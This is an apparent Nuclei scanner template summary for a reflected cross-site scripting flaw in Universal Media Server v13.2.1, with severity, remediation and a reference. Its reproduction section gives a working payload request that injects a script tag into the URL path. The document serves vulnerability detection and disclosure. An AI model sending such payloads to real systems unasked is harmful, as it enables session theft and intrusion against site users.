# Nuclei Template: Universal Media Server v13.2.1 - Cross Site Scripting
**Template ID:** universal-media-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**Source:** Nuclei Template (`universal-media-xss.yaml`)

## Vulnerability Information & PoC

## Description
Universal Media Server v13.2.1 CMS v2.0 was discovered to contain a reflected cross-site scripting (XSS) vulnerability.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/%3Cscript%3Ealert(document.domain)%3C/script%3E
```

## Remediation
Fixed in version 13.2.2

## References
- https://packetstormsecurity.com/files/171754/Universal-Media-Server-13.2.1-Cross-Site-Scripting.html
